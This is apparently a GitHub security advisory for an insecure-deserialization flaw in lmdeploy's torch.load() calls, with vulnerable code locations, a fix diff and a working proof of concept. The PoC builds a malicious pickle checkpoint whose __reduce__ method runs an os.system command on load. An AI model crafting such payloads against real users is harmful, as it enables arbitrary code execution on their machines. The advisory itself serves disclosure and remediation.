# lmdeploy vulnerable to Arbitrary Code Execution via Insecure Deserialization in torch.load()

**GHSA**: GHSA-9pf3-7rrr-x5jh | **CVE**: CVE-2025-67729 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-502

**Affected Packages**:
- **lmdeploy** (pip): <= 0.11

## Description

## Summary

An insecure deserialization vulnerability exists in lmdeploy where `torch.load()` is called without the `weights_only=True` parameter when loading model checkpoint files. This allows an attacker to execute arbitrary code on the victim's machine when they load a malicious `.bin` or `.pt` model file.


**CWE:** CWE-502 - Deserialization of Untrusted Data

---

## Details

Several locations in lmdeploy use `torch.load()` without the recommended `weights_only=True` security parameter. PyTorch's `torch.load()` uses Python's pickle module internally, which can execute arbitrary code during deserialization.

### Vulnerable Locations

**1. `lmdeploy/vl/model/utils.py` (Line 22)**

```python
def load_weight_ckpt(ckpt: str) -> Dict[str, torch.Tensor]:
    """Load checkpoint."""
    if ckpt.endswith('.safetensors'):
        return load_file(ckpt)  # Safe - uses safetensors
    else:
        return torch.load(ckpt)  # ← VULNERABLE: no weights_only=True
```

**2. `lmdeploy/turbomind/deploy/loader.py` (Line 122)**

```python
class PytorchLoader(BaseLoader):
    def items(self):
        params = defaultdict(dict)
        for shard in self.shards:
            misc = {}
            tmp = torch.load(shard, map_location='cpu')  # ← VULNERABLE
```

**Additional vulnerable locations:**
- `lmdeploy/lite/apis/kv_qparams.py:129-130`
- `lmdeploy/lite/apis/smooth_quant.py:61`
- `lmdeploy/lite/apis/auto_awq.py:101`
- `lmdeploy/lite/apis/get_small_sharded_hf.py:41`

### Note: Secure Pattern Already Exists

The codebase already uses the secure pattern in one location:

```python
# lmdeploy/pytorch/weight_loader/model_weight_loader.py:103
state = torch.load(file, weights_only=True, map_location='cpu')  # ✓ Secure
```

This shows the fix is already known and can be applied consistently across the codebase.

---

## PoC

### Step 1: Create a Malicious Checkpoint File

Save this as `create_malicious_checkpoint.py`:

```python
#!/usr/bin/env python3
"""
Creates a malicious PyTorch checkpoint that executes code when loaded.
"""
import pickle
import os

class MaliciousPayload:
    """Executes arbitrary code during pickle deserialization."""
    
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        # This is called during unpickling - returns (callable, args)
        return (os.system, (self.command,))

def create_malicious_checkpoint(output_path, command):
    """Create a malicious checkpoint file."""
    malicious_state_dict = {
        'model.layer.weight': MaliciousPayload(command),
        'config': {'hidden_size': 768}
    }
    
    with open(output_path, 'wb') as f:
        pickle.dump(malicious_state_dict, f)
    
    print(f"[+] Created malicious checkpoint: {output_path}")

if __name__ == "__main__":
    os.makedirs("malicious_model", exist_ok=True)
    create_malicious_checkpoint(
        "malicious_model/pytorch_model.bin",
        "echo '[PoC] Arbitrary code executed! - RCE confirmed'"
    )
```

### Step 2: Load the Malicious File (Simulates lmdeploy's Behavior)

Save this as `exploit.py`:

```python
#!/usr/bin/env python3
"""
Demonstrates the vulnerability by loading the malicious checkpoint.
This simulates what happens when lmdeploy loads an untrusted model.
"""
import pickle

def unsafe_load(path):
    """Simulates torch.load() without weights_only=True."""
    # torch.load() uses pickle internally, so this is equivalent
    with open(path, 'rb') as f:
        return pickle.load(f)

if __name__ == "__main__":
    print("[*] Loading malicious checkpoint...")
    print("[*] This simulates: torch.load(ckpt) in lmdeploy")
    print("-" * 50)
    
    result = unsafe_load("malicious_model/pytorch_model.bin")
    
    print("-" * 50)
    print(f"[!] Checkpoint loaded. Keys: {list(result.keys())}")
    print("[!] If you see the PoC message above, RCE is confirmed!")
```

### Step 3: Run the PoC

```bash
# Create the malicious checkpoint
python create_malicious_checkpoint.py

# Exploit - triggers code execution
python exploit.py
```

### Expected Output

```
[+] Created malicious checkpoint: malicious_model/pytorch_model.bin
[*] Loading malicious checkpoint...
[*] This simulates: torch.load(ckpt) in lmdeploy
--------------------------------------------------
[PoC] Arbitrary code executed! - RCE confirmed     ← Code executed here!
--------------------------------------------------
[!] Checkpoint loaded. Keys: ['model.layer.weight', 'config']
[!] If you see the PoC message above, RCE is confirmed!
```

The `[PoC] Arbitrary code executed!` message proves that arbitrary shell commands run during deserialization.

---

## Impact

### Who Is Affected?

- **All users** who load PyTorch model files (`.bin`, `.pt`) from untrusted sources
- This includes models downloaded from HuggingFace, ModelScope, or shared by third parties

### Attack Scenario

1. Attacker creates a malicious model file (e.g., `pytorch_model.bin`) containing a pickle payload
2. Attacker distributes it as a "fine-tuned model" on model sharing platforms or directly to victims
3. Victim downloads and loads the model using lmdeploy
4. Malicious code executes with the victim's privileges

### Potential Consequences

- **Remote Code Execution (RCE)** - Full system compromise
- **Data theft** - Access to sensitive files, credentials, API keys
- **Lateral movement** - Pivot to other systems in cloud environments
- **Cryptomining or ransomware** - Malware deployment

---

## Recommended Fix

Add `weights_only=True` to all `torch.load()` calls:

```diff
# lmdeploy/vl/model/utils.py:22
- return torch.load(ckpt)
+ return torch.load(ckpt, weights_only=True)

# lmdeploy/turbomind/deploy/loader.py:122
- tmp = torch.load(shard, map_location='cpu')
+ tmp = torch.load(shard, map_location='cpu', weights_only=True)

# Apply the same pattern to:
# - lmdeploy/lite/apis/kv_qparams.py:129-130
# - lmdeploy/lite/apis/smooth_quant.py:61
# - lmdeploy/lite/apis/auto_awq.py:101
# - lmdeploy/lite/apis/get_small_sharded_hf.py:41
```

Alternatively, consider migrating fully to SafeTensors format, which is already supported in the codebase and immune to this vulnerability class.

---

## Resources

### Official PyTorch Security Documentation

- **[PyTorch torch.load() Documentation](https://pytorch.org/docs/stable/generated/torch.load.html)**
  
  > *"torch.load() uses pickle module implicitly, which is known to be insecure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never load data that could have come from an untrusted source."*

### Related CVEs

| CVE | Description | CVSS |
|-----|-------------|------|
| [CVE-2025-32434](https://nvd.nist.gov/vuln/detail/CVE-2025-32434) | PyTorch `torch.load()` RCE vulnerability | **9.3 Critical** |
| [CVE-2024-5452](https://nvd.nist.gov/vuln/detail/CVE-2024-5452) | PyTorch Lightning insecure deserialization | **8.8 High** |

### Additional Resources

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Trail of Bits: Exploiting ML Pickle Files](https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/)
- [Rapid7: Attackers Weaponizing AI Models](https://www.rapid7.com/blog/post/2024/02/06/attackers-are-weaponizing-ai-model-files/)

---

Thank you for your time reviewing this report. I'm happy to provide any additional information or help with testing the fix. Please let me know if you have any questions!
